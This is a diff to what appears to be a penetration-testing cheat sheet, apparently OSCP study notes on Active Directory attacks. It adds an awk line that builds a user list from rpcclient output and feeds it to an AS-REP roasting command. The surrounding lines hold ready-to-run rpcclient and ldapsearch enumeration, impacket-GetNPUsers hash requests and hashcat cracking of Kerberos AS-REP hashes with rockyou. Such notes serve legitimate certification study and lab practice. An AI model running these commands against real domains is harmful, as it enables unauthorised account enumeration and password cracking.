@@ -26,7 +26,8 @@ rpcclient -U "username%passwd" <IP>
 querydispinfo 
 queryuser joe 
 querygroup 0x44f       
-querygroupmem 0x44f    
+querygroupmem 0x44f 
+cat users.raw | awk -F [ '{print $2}' | awk -F] '{print $1}' > users.txt
 ```
 
 ```bash
@@ -43,7 +44,7 @@ ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=offsec,dc=com" | grep -i
 impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
 impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat
 
-Impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+Impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile users.txt 
 
 hashcat -m 18200 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
 ```
